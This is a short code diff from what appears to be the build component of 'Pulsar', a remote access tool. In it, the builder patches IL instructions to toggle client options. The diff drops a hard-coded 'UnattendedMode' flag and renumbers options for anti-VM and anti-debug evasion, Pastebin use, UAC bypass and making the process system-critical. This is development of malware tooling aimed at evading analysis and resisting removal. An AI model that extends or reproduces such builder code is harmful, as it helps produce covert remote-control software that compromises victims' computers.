@@ -195,22 +195,19 @@ namespace Pulsar.Server.Build
                                         case 6: // HideInstallSubdirectory
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideInstallSubdirectory));
                                             break;
-                                        case 7: // UnattendedMode
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(true));
-                                            break;
-                                        case 8: // AntiVM
+                                        case 7: // AntiVM
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.AntiVM));
                                             break;
-                                        case 9: // AntiDebug
+                                        case 8: // AntiDebug
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.AntiDebug));
                                             break;
-                                        case 10: // Pastebin
+                                        case 9: // Pastebin
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.Pastebin));
                                             break;
-                                        case 11: // UACBypass
+                                        case 10: // UACBypass
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.UACBypass));
                                             break;
-                                        case 12: // CRITICALPROCESS
+                                        case 11: // CRITICALPROCESS
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.CRITICALPROCESS));
                                             break;
                                     }
